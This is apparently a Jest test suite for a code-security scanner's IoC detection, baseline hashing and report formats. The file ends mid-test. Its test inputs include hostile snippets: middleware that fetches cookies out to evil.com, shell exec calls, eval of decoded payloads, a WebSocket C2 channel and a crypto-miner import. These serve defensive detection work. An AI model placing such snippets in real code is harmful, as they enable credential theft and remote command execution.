/**
 * Copyright (c) 2025 NeuroLint
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


/**
 * Layer 8 Security Forensics Tests
 * Comprehensive test suite for IoC detection, baseline system, and reporters
 */

const path = require('path');
const fs = require('fs').promises;
const { execSync } = require('child_process');

const fixturesPath = path.join(__dirname, 'fixtures', 'layer-8');

describe('Layer 8 Security Forensics', () => {
  let Layer8;
  let SignatureAnalyzer;
  let constants;
  let CLIReporter;
  let JSONReporter;
  
  beforeAll(() => {
    Layer8 = require('../scripts/fix-layer-8-security');
    SignatureAnalyzer = require('../scripts/fix-layer-8-security/detectors/signature-analyzer');
    constants = require('../scripts/fix-layer-8-security/constants');
    const reporters = require('../scripts/fix-layer-8-security/reporters');
    CLIReporter = reporters.CLIReporter;
    JSONReporter = reporters.JSONReporter;
  });

  describe('IoC Signature Constants', () => {
    test('should have 90 IoC signatures defined', () => {
      expect(constants.IOC_SIGNATURES.signatures.length).toBe(90);
    });

    test('should have required fields for each signature', () => {
      constants.IOC_SIGNATURES.signatures.forEach((sig) => {
        expect(sig.id).toBeDefined();
        expect(sig.name).toBeDefined();
        expect(sig.pattern).toBeDefined();
        expect(sig.severity).toMatch(/^(critical|high|medium|low|info)$/);
        expect(sig.category).toBeDefined();
        expect(sig.description).toBeDefined();
        expect(sig.remediation).toBeDefined();
      });
    });

    test('should have critical severity for obfuscated eval patterns', () => {
      const evalSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-001');
      expect(evalSig.severity).toBe('critical');
    });

    test('should have high severity for Function constructor', () => {
      const fnSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-003');
      expect(fnSig.severity).toBe('high');
    });

    test('should have high severity for child process usage', () => {
      const cpSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-005');
      expect(cpSig.severity).toBe('high');
    });

    test('should include RSC-specific patterns (15+)', () => {
      const rscPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'rsc-specific'
      );
      expect(rscPatterns.length).toBeGreaterThanOrEqual(15);
    });

    test('should include Next.js-specific patterns (15+)', () => {
      const nextjsPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'nextjs-specific'
      );
      expect(nextjsPatterns.length).toBeGreaterThanOrEqual(15);
    });

    test('should include exfiltration patterns', () => {
      const exfilPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'data-exfiltration'
      );
      expect(exfilPatterns.length).toBeGreaterThan(0);
    });

    test('should include persistence and backdoor patterns', () => {
      const persistPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'backdoor' || s.category === 'persistence'
      );
      expect(persistPatterns.length).toBeGreaterThan(0);
    });

    test('should have SEVERITY_LEVELS defined', () => {
      expect(constants.SEVERITY_LEVELS).toBeDefined();
      expect(constants.SEVERITY_LEVELS.CRITICAL).toBe('critical');
      expect(constants.SEVERITY_LEVELS.HIGH).toBe('high');
      expect(constants.SEVERITY_LEVELS.MEDIUM).toBe('medium');
      expect(constants.SEVERITY_LEVELS.LOW).toBe('low');
    });

    test('should have DETECTION_MODES defined', () => {
      expect(constants.DETECTION_MODES).toBeDefined();
      expect(constants.DETECTION_MODES.QUICK).toBeDefined();
      expect(constants.DETECTION_MODES.STANDARD).toBeDefined();
      expect(constants.DETECTION_MODES.DEEP).toBeDefined();
      expect(constants.DETECTION_MODES.PARANOID).toBeDefined();
    });
  });

  describe('Signature Analyzer', () => {
    let analyzer;
    
    beforeEach(() => {
      analyzer = new SignatureAnalyzer({ verbose: false });
    });

    test('should detect obfuscated eval with atob', () => {
      const code = 'const result = eval(atob(encodedPayload));';
      const result = analyzer.analyze(code, 'test.js');
      
      expect(result.findings.length).toBeGreaterThan(0);
      const evalFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-001');
      expect(evalFinding).toBeDefined();
      expect(evalFinding.severity).toBe('critical');
    });

    test('should detect obfuscated eval with Buffer', () => {
      const code = 'eval(Buffer.from(payload, "base64").toString());';
      const result = analyzer.analyze(code, 'test.js');
      
      const bufferFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-002');
      expect(bufferFinding).toBeDefined();
      expect(bufferFinding.severity).toBe('critical');
    });

    test('should detect Function constructor', () => {
      const code = 'const fn = new Function("return " + code);';
      const result = analyzer.analyze(code, 'test.js');
      
      const fnFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-003');
      expect(fnFinding).toBeDefined();
    });

    test('should detect child_process require', () => {
      const code = "const { exec } = require('child_process');";
      const result = analyzer.analyze(code, 'test.js');
      
      const cpFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-005');
      expect(cpFinding).toBeDefined();
    });

    test('should detect shell command execution', () => {
      const code = "exec('bash -c whoami');";
      const result = analyzer.analyze(code, 'test.js');
      
      const shellFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-006');
      expect(shellFinding).toBeDefined();
      expect(shellFinding.severity).toBe('critical');
    });

    test('should detect hexadecimal escape obfuscation (10+ sequences)', () => {
      const code = `const payload = '\\x65\\x76\\x61\\x6c\\x28\\x74\\x68\\x69\\x73\\x29\\x3b\\x72';`;
      const result = analyzer.analyze(code, 'test.js');
      
      const hexFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-012');
      expect(hexFinding).toBeDefined();
      expect(hexFinding.severity).toBe('medium');
      expect(hexFinding.category).toBe('obfuscation');
    });

    test('should detect dynamic import with variable', () => {
      const code = "const mod = await import(moduleName);";
      const result = analyzer.analyze(code, 'test.js');
      
      const dynImportFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-010');
      expect(dynImportFinding).toBeDefined();
    });

    test('should detect RSC rogue use server with dangerous import', () => {
      const code = `'use server'; import('child_process');`;
      const result = analyzer.analyze(code, 'actions.js');
      
      const rscFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-016');
      expect(rscFinding).toBeDefined();
      expect(rscFinding.category).toBe('rsc-specific');
    });

    test('should NOT flag clean code with false positives', async () => {
      const cleanCode = await fs.readFile(
        path.join(fixturesPath, 'clean-code.js'),
        'utf8'
      );
      const result = analyzer.analyze(cleanCode, 'clean-code.js');
      
      const criticalFindings = result.findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(0);
    });

    test('should detect multiple vulnerabilities in vulnerable code', async () => {
      const vulnCode = await fs.readFile(
        path.join(fixturesPath, 'vulnerable-code.js'),
        'utf8'
      );
      const result = analyzer.analyze(vulnCode, 'vulnerable-code.js');
      
      expect(result.findings.length).toBeGreaterThan(2);
    });

    test('should provide line and column numbers', () => {
      const code = `line1
line2
eval(atob(payload));
line4`;
      const result = analyzer.analyze(code, 'test.js');
      
      const finding = result.findings[0];
      expect(finding).toBeDefined();
      expect(finding.line).toBeGreaterThan(0);
    });

    test('should have execution time tracking', () => {
      const code = 'const x = 1;';
      const result = analyzer.analyze(code, 'test.js');
      
      expect(result.executionTime).toBeDefined();
      expect(typeof result.executionTime).toBe('number');
    });

    test('should detect server action with eval (IOC-019)', () => {
      const code = `'use server'; async function action() { return eval(code); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-019');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('rsc-specific');
    });

    test('should detect server action with process spawn (IOC-020)', () => {
      const code = `'use server'; import { exec } from 'child_process'; exec('ls');`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-020');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('rsc-specific');
    });

    test('should detect middleware cookie exfiltration (IOC-037)', () => {
      const code = `export async function middleware(req) {
        const c = cookies();
        await fetch('https://evil.com', { body: JSON.stringify(c) });
      }`;
      const result = analyzer.analyze(code, 'middleware.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-037');
      expect(finding).toBeDefined();
      expect(finding.category).toBe('nextjs-specific');
    });

    test('should detect route handler shell execution (IOC-038)', () => {
      const code = `export async function GET(request) {
        exec('bash -c whoami');
        return Response.json({});
      }`;
      const result = analyzer.analyze(code, 'route.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-038');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('nextjs-specific');
    });

    test('should detect AWS credentials in code (IOC-056)', () => {
      const code = `const awsKey = 'AKIAIOSFODNN7EXAMPLE';`;
      const result = analyzer.analyze(code, 'config.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-056');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('data-exfiltration');
    });

    test('should detect SSH private key in code (IOC-048)', () => {
      const code = `const key = '-----BEGIN RSA PRIVATE KEY-----';`;
      const result = analyzer.analyze(code, 'secrets.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-048');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('backdoor');
    });

    test('should detect crypto mining library import (IOC-068)', () => {
      const code = `const miner = require('coinhive');`;
      const result = analyzer.analyze(code, 'worker.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-068');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('crypto-mining');
    });

    test('should detect server action WebSocket exfiltration (IOC-071)', () => {
      const code = `'use server'; async function leak() { new WebSocket('wss://192.168.1.1/data'); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-071');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('rsc-specific');
    });

    test('should detect server action WebSocket C2 channel (IOC-072)', () => {
      const code = `'use server'; async function c2() { ws.on('message', (data) => eval(data)); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-072');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
    });

    test('should detect malicious service worker registration (IOC-073)', () => {
      const code = `navigator.serviceWorker.register('https://192.168.1.1/sw.js');`;
      const result = analyzer.analyze(code, 'app.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-073');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
    });

    test('should detect service worker fetch interception to IP (IOC-074)', () => {
      const code = `self.addEventListener('fetch', (e) => { e.respondWith(fetch('https://10.0.0.1/proxy')); });`;
      const result = analyzer.analyze(code, 'sw.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-074');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect PWA manifest tampering with IP (IOC-075)', () => {
      const code = `{"start_url": "https://192.168.1.100/malicious"}`;
      const result = analyzer.analyze(code, 'manifest.json');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-075');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect PWA manifest malicious scope (IOC-076)', () => {
      const code = `{"scope": "https://evil-domain.com/"}`;
      const result = analyzer.analyze(code, 'manifest.webmanifest');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-076');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('medium');
    });

    test('should detect server action response caching attack (IOC-077)', () => {
      const code = `'use server'; export async function getData() { cache(cookies().get('session')); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-077');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect server action streaming attack (IOC-078)', () => {
      const code = `'use server'; async function stream() { new ReadableStream({ start() { push(process.env.SECRET); }}); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-078');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect server action FormData injection (IOC-079)', () => {
      const code = `"use server"
        const data = formData.get('cmd');
        eval(data);`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-079');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect server action bind exploitation (IOC-080)', () => {
      const code = `const action = handler.bind(null, payload); 'use server';`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-080');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });
  });

  describe('Layer 8 Interface', () => {
    test('should expose analyze method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.analyze).toBe('function');
    });

    test('should expose transform method (read-only by default)', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.transform).toBe('function');
    });

    test('should expose scanCompromise method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.scanCompromise).toBe('function');
    });

    test('should expose createBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.createBaseline).toBe('function');
    });

    test('should expose compareBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.compareBaseline).toBe('function');
    });

    test('should expose printReport method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.printReport).toBe('function');
    });

    test('should expose generateJSONReport method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.generateJSONReport).toBe('function');
    });

    test('should scan fixtures directory and return results', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise(fixturesPath);
      
      expect(result.findings).toBeDefined();
      expect(Array.isArray(result.findings)).toBe(true);
    });

    test('should respect mode settings', async () => {
      const quickLayer = new Layer8({ mode: 'quick' });
      const standardLayer = new Layer8({ mode: 'standard' });
      
      const quickResult = await quickLayer.scanCompromise(fixturesPath);
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      
      expect(quickResult.mode).toBe('quick');
      expect(standardResult.mode).toBe('standard');
    });

    test('should handle empty directories gracefully', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const emptyDir = path.join(__dirname, '.empty-test-dir');
      
      try {
        await fs.mkdir(emptyDir, { recursive: true });
        const result = await layer8.scanCompromise(emptyDir);
        
        expect(result.findings).toBeDefined();
        expect(result.findings.length).toBe(0);
      } finally {
        try { await fs.rmdir(emptyDir); } catch (e) {}
      }
    });
  });

  describe('Baseline System', () => {
    const testBaselinePath = path.join(__dirname, '.test-baseline.json');
    
    afterEach(async () => {
      try {
        await fs.unlink(testBaselinePath);
      } catch (e) {}
    });

    test('should create baseline with file hashes', async () => {
      const layer8 = new Layer8();
      const result = await layer8.createBaseline(fixturesPath, {
        output: testBaselinePath
      });
      
      expect(result.success).toBe(true);
      expect(result.fileCount).toBeGreaterThan(0);
      expect(result.baselinePath).toBe(testBaselinePath);
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      expect(baseline.version).toBeDefined();
      expect(baseline.created).toBeDefined();
      expect(baseline.files).toBeDefined();
      expect(Object.keys(baseline.files).length).toBeGreaterThan(0);
    });

    test('should detect unchanged files in comparison', async () => {
      const layer8 = new Layer8();
      
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const comparison = await layer8.compareBaseline(fixturesPath, testBaselinePath);
      
      expect(comparison.comparison.hasChanges).toBe(false);
      expect(comparison.summary.unchanged).toBeGreaterThan(0);
      expect(comparison.summary.modified).toBe(0);
    });

    test('should include SHA256 file hashes in baseline', async () => {
      const layer8 = new Layer8();
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      
      const fileEntries = Object.entries(baseline.files);
      expect(fileEntries.length).toBeGreaterThan(0);
      
      const [fileName, fileHash] = fileEntries[0];
      expect(typeof fileName).toBe('string');
      expect(typeof fileHash).toBe('string');
      expect(fileHash.length).toBe(64);
    });

    test('should include baseline date in comparison', async () => {
      const layer8 = new Layer8();
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const comparison = await layer8.compareBaseline(fixturesPath, testBaselinePath);
      
      expect(comparison.baselineDate).toBeDefined();
    });
  });

  describe('CLI Reporter', () => {
    test('should generate report from scan result', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [
          {
            signatureId: 'NEUROLINT-IOC-001',
            signatureName: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10,
            column: 5,
            matchedText: 'eval(atob(x))',
            description: 'Dangerous eval usage',
            remediation: 'Remove eval',
            confidence: 0.95
          }
        ],
        stats: {
          filesScanned: 100,
          filesSkipped: 5
        }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('Eval Usage');
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should generate summary section', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [
          { id: 'TEST-001', severity: 'critical', name: 'Test' },
          { id: 'TEST-002', severity: 'high', name: 'Test' }
        ],
        stats: { filesScanned: 100, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should show clean status when no findings', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [],
        stats: { filesScanned: 50, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('CLEAN');
    });
  });

  describe('JSON Reporter', () => {
    test('should generate valid JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          {
            id: 'NEUROLINT-IOC-001',
            name: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10
          }
        ],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, { targetPath: '/test' });
      const parsed = JSON.parse(output);
      
      expect(parsed.findings).toBeDefined();
      expect(parsed.findings.length).toBe(1);
      expect(parsed.summary).toBeDefined();
    });

    test('should include metadata in JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, { 
        targetPath: '/test',
        mode: 'standard'
      });
      const parsed = JSON.parse(output);
      
      expect(parsed.metadata).toBeDefined();
      expect(parsed.timestamp).toBeDefined();
    });

    test('should be machine-parseable and filterable', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          { id: 'TEST-001', severity: 'high', file: 'a.js', name: 'Test1' },
          { id: 'TEST-002', severity: 'critical', file: 'b.js', name: 'Test2' }
        ],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(() => JSON.parse(output)).not.toThrow();
      
      const parsed = JSON.parse(output);
      const criticalFindings = parsed.findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(1);
    });

    test('should include schema reference', () => {
      const reporter = new JSONReporter();
      const scanResult = { findings: [], stats: {} };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      
      expect(parsed.$schema).toBeDefined();
    });
  });

  describe('CLI Integration', () => {
    test('should run security:scan-compromise command', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should support --json output flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --json 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      const jsonMatch = output.match(/\{[\s\S]*\}/);
      expect(jsonMatch).toBeTruthy();
      expect(() => JSON.parse(jsonMatch[0])).not.toThrow();
    });

    test('should show help for security commands', () => {
      const output = execSync('node cli.js help 2>&1', { encoding: 'utf8' });
      
      expect(output).toContain('security:scan-compromise');
      expect(output).toContain('security:create-baseline');
      expect(output).toContain('security:compare-baseline');
    });

    test('should accept --verbose flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --verbose 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
    });

    test('should create and compare baseline via CLI', () => {
      const baselineDir = path.join(__dirname, '.cli-baseline-test');
      const baselineFile = path.join(baselineDir, 'test-baseline.json');
      
      try {
        require('fs').mkdirSync(baselineDir, { recursive: true });
        
        const createOutput = execSync(
          `node cli.js security:create-baseline ${fixturesPath} --output=${baselineFile} 2>&1`,
          { encoding: 'utf8', timeout: 30000 }
        );
        
        expect(createOutput).toContain('baseline created');
        expect(require('fs').existsSync(baselineFile)).toBe(true);
        
      } finally {
        try {
          require('fs').rmSync(baselineDir, { recursive: true, force: true });
        } catch (e) {}
      }
    });
  });

  describe('Scan Modes', () => {
    test('quick mode should complete in reasonable time', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const start = Date.now();
      await layer8.scanCompromise(fixturesPath);
      const quickTime = Date.now() - start;
      
      expect(quickTime).toBeLessThan(5000);
    });

    test('paranoid mode should potentially find more patterns', async () => {
      const standardLayer = new Layer8({ mode: 'standard' });
      const paranoidLayer = new Layer8({ mode: 'paranoid' });
      
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      const paranoidResult = await paranoidLayer.scanCompromise(fixturesPath);
      
      expect(paranoidResult.findings.length).toBeGreaterThanOrEqual(
        standardResult.findings.length
      );
    });

    test('all modes should be valid', () => {
      const modes = ['quick', 'standard', 'deep', 'paranoid'];
      
      modes.forEach(mode => {
        expect(() => new Layer8({ mode })).not.toThrow();
      });
    });
  });

  describe('Error Handling', () => {
    test('should handle non-existent path gracefully', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise('/non/existent/path/12345');
      
      expect(result.findings).toBeDefined();
      expect(result.findings.length).toBe(0);
    });

    test('should handle binary files without crashing', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise(fixturesPath);
      
      expect(result).toBeDefined();
      expect(result.findings).toBeDefined();
    });

    test('should handle malformed baseline file', async () => {
      const layer8 = new Layer8();
      const badBaselinePath = path.join(__dirname, '.bad-baseline.json');
      
      try {
        await fs.writeFile(badBaselinePath, 'not valid json');
        
        await expect(
          layer8.compareBaseline(fixturesPath, badBaselinePath)
        ).rejects.toThrow();
      } finally {
        try { await fs.unlink(badBaselinePath); } catch (e) {}
      }
    });
  });

  describe('SARIF Reporter', () => {
    let SARIFReporter;
    
    beforeAll(() => {
      SARIFReporter = require('../scripts/fix-layer-8-security/reporters/sarif-reporter');
    });

    test('should generate valid SARIF 2.1.0 output', () => {
      const reporter = new SARIFReporter();
      const scanResult = {
        findings: [
          {
            signatureId: 'NEUROLINT-IOC-001',
            signatureName: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10,
            column: 5,
            matchedText: 'eval(atob(x))',
            description: 'Dangerous eval usage',
            remediation: 'Remove eval',
            category: 'code-injection',
            confidence: 0.95
          }
        ],
        stats: { filesScanned: 100, filesSkipped: 5 }
      };
      
      const output = reporter.generateReport(scanResult, { targetPath: '/test' });
      const parsed = JSON.parse(output);
      
      expect(parsed.$schema).toContain('sarif-schema-2.1.0');
      expect(parsed.version).toBe('2.1.0');
      expect(parsed.runs).toBeDefined();
      expect(parsed.runs[0].tool.driver.name).toContain('NeuroLint');
    });

    test('should generate rules from findings', () => {
      const reporter = new SARIFReporter();
      const scanResult = {
        findings: [
          { signatureId: 'TEST-001', signatureName: 'Test Rule', severity: 'high', description: 'Test' },
          { signatureId: 'TEST-002', signatureName: 'Test Rule 2', severity: 'medium', description: 'Test 2' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      
      expect(parsed.runs[0].tool.driver.rules.length).toBe(2);
    });

    test('should map severity to SARIF levels correctly', () => {
      const reporter = new SARIFReporter();
      const scanResult = {
        findings: [
          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical', file: 'a.js' },
          { signatureId: 'HIGH-001', severity: 'high', signatureName: 'High', file: 'b.js' },
          { signatureId: 'MED-001', severity: 'medium', signatureName: 'Medium', file: 'c.js' },
          { signatureId: 'LOW-001', severity: 'low', signatureName: 'Low', file: 'd.js' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      const results = parsed.runs[0].results;
      
      expect(results[0].level).toBe('error');
      expect(results[1].level).toBe('error');
      expect(results[2].level).toBe('warning');
      expect(results[3].level).toBe('note');
    });

    test('should validate SARIF schema', () => {
      const reporter = new SARIFReporter();
      const scanResult = { findings: [], stats: {} };
      
      const output = reporter.generateReport(scanResult, {});
      const validation = reporter.validateSchema(output);
      
      expect(validation.valid).toBe(true);
    });

    test('should generate fingerprints for findings', () => {
      const reporter = new SARIFReporter();
      const scanResult = {
        findings: [
          { signatureId: 'TEST-001', signatureName: 'Test', severity: 'high', file: 'test.js', line: 10, column: 5 }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      
      expect(parsed.runs[0].results[0].fingerprints).toBeDefined();
      expect(parsed.runs[0].results[0].fingerprints.primaryLocationLineHash).toBeDefined();
    });

    test('should include security severity scores', () => {
      const reporter = new SARIFReporter();
      const scanResult = {
        findings: [
          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical', file: 'a.js' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      
      expect(parsed.runs[0].tool.driver.rules[0].properties.securitySeverity).toBe('9.0');
    });
  });

  describe('HTML Reporter', () => {
    let HTMLReporter;
    
    beforeAll(() => {
      HTMLReporter = require('../scripts/fix-layer-8-security/reporters/html-reporter');
    });

    test('should generate valid HTML document', () => {
      const reporter = new HTMLReporter();
      const scanResult = {
        findings: [
          { signatureId: 'TEST-001', signatureName: 'Test', severity: 'high', file: 'test.js', line: 10 }
        ],
        stats: { filesScanned: 50 }
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('<!DOCTYPE html>');
      expect(output).toContain('<html');
      expect(output).toContain('</html>');
      expect(output).toContain('Security Forensics Report');
    });

    test('should include embedded CSS', () => {
      const reporter = new HTMLReporter();
      const scanResult = { findings: [], stats: {} };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('<style>');
      expect(output).toContain('</style>');
      expect(output).toContain('--color-critical');
    });

    test('should include embedded JavaScript', () => {
      const reporter = new HTMLReporter();
      const scanResult = { findings: [], stats: {} };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('<script>');
      expect(output).toContain('</script>');
    });

    test('should show CLEAN status when no findings', () => {
      const reporter = new HTMLReporter();
      const scanResult = { findings: [], stats: { filesScanned: 100 } };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('CLEAN');
      expect(output).toContain('No Issues Detected');
    });

    test('should show CRITICAL status when critical findings exist', () => {
      const reporter = new HTMLReporter();
      const scanResult = {
        findings: [
          { signatureId: 'CRIT-001', severity: 'critical', signatureName: 'Critical Issue', file: 'test.js' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('CRITICAL');
      expect(output).toContain('Immediate Action Required');
    });

    test('should generate remediation checklist', () => {
      const reporter = new HTMLReporter({ includeRemediation: true });
      const scanResult = {
        findings: [
          { signatureId: 'TEST-001', severity: 'high', signatureName: 'Test', remediation: 'Fix this issue', file: 'a.js' },
          { signatureId: 'TEST-002', severity: 'high', signatureName: 'Test', remediation: 'Fix this issue', file: 'b.js' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).toContain('Remediation Checklist');
      expect(output).toContain('checkbox');
    });

    test('should escape HTML in findings', () => {
      const reporter = new HTMLReporter();
      const scanResult = {
        findings: [
          { signatureId: 'XSS-001', severity: 'high', signatureName: '<script>alert(1)</script>', file: 'test.js' }
        ],
        stats: {}
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(output).not.toContain('<script>alert(1)</script>');
      expect(output).toContain('&lt;script&gt;');
    });
  });

  describe('Behavioral Analyzer', () => {
    let BehavioralAnalyzer;
    
    beforeAll(() => {
      BehavioralAnalyzer = require('../scripts/fix-layer-8-security/detectors/behavioral-analyzer');
    });

    test('should detect direct eval() calls', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'const result = eval(userInput);';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      expect(findings.length).toBeGreaterThan(0);
      const evalFinding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-001');
      expect(evalFinding).toBeDefined();
      expect(evalFinding.severity).toBe('critical');
    });

    test('should detect setTimeout with string argument', () => {
      const analyzer = new BehavioralAnalyzer();
      const code = 'setTimeout("alert(1)", 1000);';
      
      const findings = analyzer.analyze(code, 'test.js');
      
      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-002');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('high');
    });

    test('should detect Function constructor', () => {
